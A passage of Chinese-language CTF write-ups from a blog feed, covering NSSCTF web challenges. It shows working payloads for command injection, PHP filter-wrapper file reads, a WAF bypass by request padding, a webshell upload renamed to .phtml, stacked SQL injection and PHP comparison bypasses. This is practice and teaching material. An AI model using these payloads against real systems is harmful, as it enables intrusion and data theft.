class="line">?url=tac /flllll\aaaaaaggggggg | tee 2.txt</span><br></pre></td></tr></table></figure><p><img src="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b34.png" class="lazyload" data-srcset="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b34.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>得到 flag</p><h2 id="swpuctf-2022-新生赛ez_ez_php"><a class="markdownIt-Anchor" href="#swpuctf-2022-新生赛ez_ez_php">#</a> [SWPUCTF 2022 新生赛] ez_ez_php</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p><img src="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b35.png" class="lazyload" data-srcset="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b35.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>删去.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=flag</span><br></pre></td></tr></table></figure><p><img src="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b36.png" class="lazyload" data-srcset="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b36.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p><img src="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b37.png" class="lazyload" data-srcset="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b37.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p 01381eab-bbcb-4599-a525-be5dc8ab300f>NSSCTF</p><h2 id="鹏城杯-2022简单包含"><a class="markdownIt-Anchor" href="#鹏城杯-2022简单包含">#</a> [鹏城杯 2022] 简单包含</h2><p>POST <code>flag=/var/www/html/flag.php</code></p><p><img src="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b38.png" class="lazyload" data-srcset="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b38.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>触发 waf，这里简要记录一下 waf</p><blockquote><p>WAF 全称叫 Web Application Firewall，和传统防火墙的区别是，它是工作在应用层的防火墙，主要对 web 请求 / 响应进行防护。</p><p>Web 应用防火墙可以防止 web 应用免受各种常见攻击，如 SQL 注入，跨站脚本漏洞 XSS 等。WAF 也能够监测并过滤掉某些可以让应用遭受 DOS（拒绝服务）攻击的流量。WAF 会在 HTTP 流量抵达应用服务器之前检测可疑访问，同时，他们也能防止从 web 应用获取某些未经授权的数据。</p><p><img src="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b39.png" class="lazyload" data-srcset="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b39.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p></blockquote><p>这里尝试一下 php 伪协议</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p>还是触发 waf，那读取一下 index.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure><p><img src="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b40-17060128515931.png" class="lazyload" data-srcset="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b40-17060128515931.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$path = $_POST[&quot;flag&quot;];</span><br><span class="line"></span><br><span class="line">if (strlen(file_get_contents(&#x27;php://input&#x27;)) &lt; 800 &amp;&amp; preg_match(&#x27;/flag/&#x27;, $path)) &#123;</span><br><span class="line">    echo &#x27;nssctf waf!&#x27;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    @include($path);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;code&gt;&lt;span style=&quot;color: #000000&quot;&gt;</span><br><span class="line">&lt;span style=&quot;color: #0000BB&quot;&gt;&amp;lt;?php&amp;nbsp;&lt;br /&gt;highlight_file&lt;/span&gt;&lt;span style=&quot;color: #007700&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;color: #0000BB&quot;&gt;__FILE__&lt;/span&gt;&lt;span style=&quot;color: #007700&quot;&gt;);&lt;br /&gt;include(&lt;/span&gt;&lt;span style=&quot;color: #0000BB&quot;&gt;$_POST&lt;/span&gt;&lt;span style=&quot;color: #007700&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;color: #DD0000&quot;&gt;&quot;flag&quot;&lt;/span&gt;&lt;span style=&quot;color: #007700&quot;&gt;]);&lt;br /&gt;&lt;/span&gt;&lt;span style=&quot;color: #FF8000&quot;&gt;//flag&amp;nbsp;in&amp;nbsp;/var/www/html/flag.php;&lt;/span&gt;</span><br><span class="line">&lt;/span&gt;</span><br><span class="line">&lt;/code&gt;&lt;br /&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>flag 被过滤了，但是这个 if 条件有个很明显的绕过，&amp;&amp; 说明要同时满足两个条件，而且第一个条件是字数 &lt; 800 的条件，只要超过就不满足条件，就可以获取 flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=a....(800个a)&amp;flag=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p><img src="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b41.png" class="lazyload" data-srcset="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b41.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p><img src="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b42.png" class="lazyload" data-srcset="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b42.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p 8fa94955-8ac7-46d7-9b24-05b56bd0d2d1>NSSCTF</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;nisactf-2022easyssrf&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#nisactf-2022easyssrf&quot;&gt;#&lt;/a&gt; [NISACTF 2022]easyssrf&lt;/h2&gt;</summary>
    
    
    
    <category term="NSSCTF" scheme="https://dr4x3zz.github.io/categories/NSSCTF/"/>
    
    
    <category term="NSSCTF" scheme="https://dr4x3zz.github.io/tags/NSSCTF/"/>
    
  </entry>
  
  <entry>
    <title>NSSCTF刷题1</title>
    <link href="https://dr4x3zz.github.io/2023/09/17/NSSCTF%E5%88%B7%E9%A2%981/"/>
    <id>https://dr4x3zz.github.io/2023/09/17/NSSCTF%E5%88%B7%E9%A2%981/</id>
    <published>2023-09-17T13:30:13.000Z</published>
    <updated>2024-01-26T08:28:38.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="swpuctf-2021-新生赛easyupload20"><a class="markdownIt-Anchor" href="#swpuctf-2021-新生赛easyupload20">#</a> [SWPUCTF 2021 新生赛] easyupload2.0</h2><span id="more"></span><p>上传一句话木马图片，抓包将后缀名改为 php</p><p>显示 php 是不行的</p><p>所以将后缀名改为 phtml 后</p><p><img src="/2023/09/17/NSSCTF%E5%88%B7%E9%A2%981/001.png" class="lazyload" data-srcset="/2023/09/17/NSSCTF%E5%88%B7%E9%A2%981/001.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="001"></p><p><img src="/2023/09/17/NSSCTF%E5%88%B7%E9%A2%981/002.png" class="lazyload" data-srcset="/2023/09/17/NSSCTF%E5%88%B7%E9%A2%981/002.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="002"></p><p>上传成功，路径也爆出了</p><p>用蚁剑连接</p><p>在上级目录可以找到 flag.php</p><p 9ef1df17-96da-475c-bac6-86c579fb694a>NSSCTF</p><h2 id="suctf-2019easysql"><a class="markdownIt-Anchor" href="#suctf-2019easysql">#</a> [suctf 2019]EasySQL</h2><p><img src="/2023/09/17/NSSCTF%E5%88%B7%E9%A2%981/003.png" class="lazyload" data-srcset="/2023/09/17/NSSCTF%E5%88%B7%E9%A2%981/003.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>先输入 1 查看有回显</p><p><img src alt><img src="/2023/09/17/NSSCTF%E5%88%B7%E9%A2%981/004.png" class="lazyload" data-srcset="/2023/09/17/NSSCTF%E5%88%B7%E9%A2%981/004.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="004"></p><p>字母无回显</p><p><img src="/2023/09/17/NSSCTF%E5%88%B7%E9%A2%981/005.png" class="lazyload" data-srcset="/2023/09/17/NSSCTF%E5%88%B7%E9%A2%981/005.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>单引号注入，回显提示不一样，猜测有注入点</p><p>后面尝试盲注报错注入都不行，试试堆叠注入</p><p>查看数据库<img src="/2023/09/17/NSSCTF%E5%88%B7%E9%A2%981/006.png" class="lazyload" data-srcset="/2023/09/17/NSSCTF%E5%88%B7%E9%A2%981/006.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>查看表名</p><p><img src="/2023/09/17/NSSCTF%E5%88%B7%E9%A2%981/007.png" class="lazyload" data-srcset="/2023/09/17/NSSCTF%E5%88%B7%E9%A2%981/007.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>查看 flag 字段<br><img src="/2023/09/17/NSSCTF%E5%88%B7%E9%A2%981/008.png" class="lazyload" data-srcset="/2023/09/17/NSSCTF%E5%88%B7%E9%A2%981/008.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>失败</p><p>通过上面我们可以发现表名和字段名只有一个 Flag，尝试怎么查看这个 Flag</p><p>查阅了网上的 wp，比较相对来说简单的解法是用到 sql_mode=PIPES_AS_CONCAT</p><p><img src="/2023/09/17/NSSCTF%E5%88%B7%E9%A2%981/009.png" class="lazyload" data-srcset="/2023/09/17/NSSCTF%E5%88%B7%E9%A2%981/009.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>将 || 作为字符串连接符，因此需要在语句中更改其配置<br> sql_mode=PIPES_AS_CONCAT 时即可<br> Payload:<strong>1;set sql_mode=PIPES_AS_CONCAT;select 1</strong></p><p>这题内置的 sql 语句为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">sql</span><span class="operator">=</span>&quot;select&quot;.post[‘query’].&quot;||flag from Flag&quot;;</span><br></pre></td></tr></table></figure><p>所以更改配置后 || 变成了 CONCAT () 的用法了</p><p>拼接完之后：select 1;set sql_mode=PIPES_AS_CONCAT;select 1||flag from Flag<br> 相当于是 select 1 from Flag 和 select flag from Flag</p><p>这题有两种解法一种是猜测院代码，第二种是更改配置<br> sql_mode=PIPES_AS_CONCAT，我觉得不管怎么样都要猜测到函数用到了 ||</p><p><img src="/2023/09/17/NSSCTF%E5%88%B7%E9%A2%981/010.png" class="lazyload" data-srcset="/2023/09/17/NSSCTF%E5%88%B7%E9%A2%981/010.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>得到 flag</p><h2 id="鹤城杯-2021easyp"><a class="markdownIt-Anchor" href="#鹤城杯-2021easyp">#</a> [鹤城杯 2021] EasyP</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;utils.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$guess</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$guess</span> === <span class="variable">$secret</span>) &#123;</span><br><span class="line">        <span class="variable">$message</span> = <span class="string">&#x27;Congratulations! The flag is: &#x27;</span> . <span class="variable">$flag</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$message</span> = <span class="string">&#x27;Wrong. Try Again&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/utils\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;hacker :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/show_source/&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;hacker :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;show_source&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p><code>$_SERVE['PHP_SELF']</code>  读取当前执行脚本文件名，就是读取文件夹下的一个文件</p><p><code>$_SERVER['REQUEST_URI']</code>  是取得当前 URL 的路径地址，就是剔除域名剩下的就是 URL 路径地址，无论后面的数据请求是否正确都成立。</p><p><code>basename()</code></p><p><img src="/2023/09/17/NSSCTF%E5%88%B7%E9%A2%981/b43-17060140007664.png" class="lazyload" data-srcset="/2023/09/17/NSSCTF%E5%88%B7%E9%A2%981/b43-17060140007664.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p><img src="/2023/09/17/NSSCTF%E5%88%B7%E9%A2%981/b44-17060139969693.png" class="lazyload" data-srcset="/2023/09/17/NSSCTF%E5%88%B7%E9%A2%981/b44-17060139969693.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>三个变量或者函数可以看这篇文章：<a href="https://blog.csdn.net/qq_51295677/article/details/124237892">https://blog.csdn.net/qq_51295677/article/details/124237892</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (preg_match(&#x27;/show_source/&#x27;, $_SERVER[&#x27;REQUEST_URI&#x27;]))&#123;</span><br><span class="line">    exit(&quot;hacker :)&quot;);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>这个正则可以使用</p><p>[</p><p>空格</p><ul><li></li></ul><p>.</p><p>上面的四个字符取一即可，都可以被处理成_</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (preg_match(&#x27;/utils\.php\/*$/i&#x27;, $_SERVER[&#x27;PHP_SELF&#x27;]))&#123;</span><br><span class="line">    exit(&quot;hacker :)&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个使用中文绕过</p><p>题解可以参考上面的连接和这个链接：<a href="https://www.cnblogs.com/FPointzero/p/16438478.html">https://www.cnblogs.com/FPointzero/p/16438478.html</a></p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php/utils.php/嗯哼?show%20source=1</span><br></pre></td></tr></table></figure><p><img src="/2023/09/17/NSSCTF%E5%88%B7%E9%A2%981/b45-17060145636126.png" class="lazyload" data-srcset="/2023/09/17/NSSCTF%E5%88%B7%E9%A2%981/b45-17060145636126.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="b45"></p><h2 id="litctf-2023http-pro-max-plus"><a class="markdownIt-Anchor" href="#litctf-2023http-pro-max-plus">#</a> [LitCTF 2023]Http pro max plus</h2><p>页面显示只允许本地访问，第一个想到的肯定是 xff，抓包</p><p>这里抓完包最下面有两行空着的，不能漏了</p><p><img src="/2023/09/17/NSSCTF%E5%88%B7%E9%A2%981/b46.png" class="lazyload" data-srcset="/2023/09/17/NSSCTF%E5%88%B7%E9%A2%981/b46.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>XFF 不行那就换一个，添加 Client-Ip</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Client-Ip: 127.0.0.1</span><br></pre></td></tr></table></figure><p><img src="/2023/09/17/NSSCTF%E5%88%B7%E9%A2%981/b47.png" class="lazyload" data-srcset="/2023/09/17/NSSCTF%E5%88%B7%E9%A2%981/b47.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>添加 Referer</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: pornhub.com</span><br></pre></td></tr></table></figure><p><img src="/2023/09/17/NSSCTF%E5%88%B7%E9%A2%981/b48.png" class="lazyload" data-srcset="/2023/09/17/NSSCTF%E5%88%B7%E9%A2%981/b48.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>修改 User-Agent</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: Chrome</span><br></pre></td></tr></table></figure><p><img src="/2023/09/17/NSSCTF%E5%88%B7%E9%A2%981/b49.png" class="lazyload" data-srcset="/2023/09/17/NSSCTF%E5%88%B7%E9%A2%981/b49.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>添加 Via</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Via: Clash.win</span><br></pre></td></tr></table></figure><p><img src="/2023/09/17/NSSCTF%E5%88%B7%E9%A2%981/b50.png" class="lazyload" data-srcset="/2023/09/17/NSSCTF%E5%88%B7%E9%A2%981/b50.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>访问 wtfwtfwtfwtf.php</p><p><img src="/2023/09/17/NSSCTF%E5%88%B7%E9%A2%981/b51.png" class="lazyload" data-srcset="/2023/09/17/NSSCTF%E5%88%B7%E9%A2%981/b51.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>访问 sejishikong.php</p><p><img src="/2023/09/17/NSSCTF%E5%88%B7%E9%A2%981/b52.png" class="lazyload" data-srcset="/2023/09/17/NSSCTF%E5%88%B7%E9%A2%981/b52.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>拿到 flag</p><p 74859f7a-79ad-4830-9b7c-ce06c3ad8680>NSSCTF</p><h2 id="nssctf-2022-spring-recruitbabyphp"><a class="markdownIt-Anchor" href="#nssctf-2022-spring-recruitbabyphp">#</a> [NSSCTF 2022 Spring Recruit]babyphp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">![b54](E:/Screenshots/b54.png) <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>])&amp;&amp;!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]/&#x27;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>])&amp;&amp;<span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b1&#x27;</span>])&amp;&amp;<span class="variable">$_POST</span>[<span class="string">&#x27;b2&#x27;</span>])&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b1&#x27;</span>]!=<span class="variable">$_POST</span>[<span class="string">&#x27;b2&#x27;</span>]&amp;&amp;<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b1&#x27;</span>])===<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b2&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c1&#x27;</span>]!=<span class="variable">$_POST</span>[<span class="string">&#x27;c2&#x27;</span>]&amp;&amp;<span class="title function_ invoke__">is_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c1&#x27;</span>])&amp;&amp;<span class="title function_ invoke__">is_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c2&#x27;</span>])&amp;&amp;<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c1&#x27;</span>])==<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c2&#x27;</span>]))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;yee&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;nop&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;go on&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;let&#x27;s get some php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> <span class="comment"># let&#x27;s get some php</span></span><br></pre></td></tr></table></figure><p>这题要满足三个条件 a、b1 和 b2、c1 和 c2</p><p><img src="/2023/09/17/NSSCTF%E5%88%B7%E9%A2%981/b53.png" class="lazyload" data-srcset="/2023/09/17/NSSCTF%E5%88%B7%E9%A2%981/b53.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>这里可以使用数组绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a[]=0</span><br></pre></td></tr></table></figure><p><img src="/2023/09/17/NSSCTF%E5%88%B7%E9%A2%981/b54.png" class="lazyload" data-srcset="/2023/09/17/NSSCTF%E5%88%B7%E9%A2%981/b54.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p><img src="/2023/09/17/NSSCTF%E5%88%B7%E9%A2%981/b55.png" class="lazyload" data-srcset="/2023/09/17/NSSCTF%E5%88%B7%E9%A2%981/b55.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>b1 和 b2 也可以使用数组绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a[]=0&amp;b1[]=1&amp;b2[]=2</span><br></pre></td></tr></table></figure><p><img src="/2023/09/17/NSSCTF%E5%88%B7%E9%A2%981/b56.png" class="lazyload" data-srcset="/2023/09/17/NSSCTF%E5%88%B7%E9%A2%981/b56.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>最后这个 c1 和 c2 就是 md5 弱比较</p><p><img src="/2023/09/17/NSSCTF%E5%88%B7%E9%A2%981/b57.png" class="lazyload" data-srcset="/2023/09/17/NSSCTF%E5%88%B7%E9%A2%981/b57.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p 9a4b52bd-8f92-4513-bdba-69590b3b1827>NSSCTF</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;swpuctf-2021-新生赛easyupload20&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#swpuctf-2021-新生赛easyupload20&quot;&gt;#&lt;/a&gt; [SWPUCTF 2021 新生赛] easyupload2.0&lt;/h2&gt;</summary>
    
    
    
    <category term="NSSCTF" scheme="https://dr4x3zz.github.io/categories/NSSCTF/"/>
    
    
    <category term="NSSCTF" scheme="https://dr4x3zz.github.io/tags/NSSCTF/"/>
    
  </entry>
  
  <entry>
    <title>鲲鹏杯wp</title>
    <link href="https://dr4x3zz.github.io/2023/04/23/%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/"/>
    <id>https://dr4x3zz.github.io/2023/04/23/%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/</id>
    <published>2023-04-23T15:51:21.000Z</published>
    <updated>2024-01-30T12:40:36.000Z</updated>
    
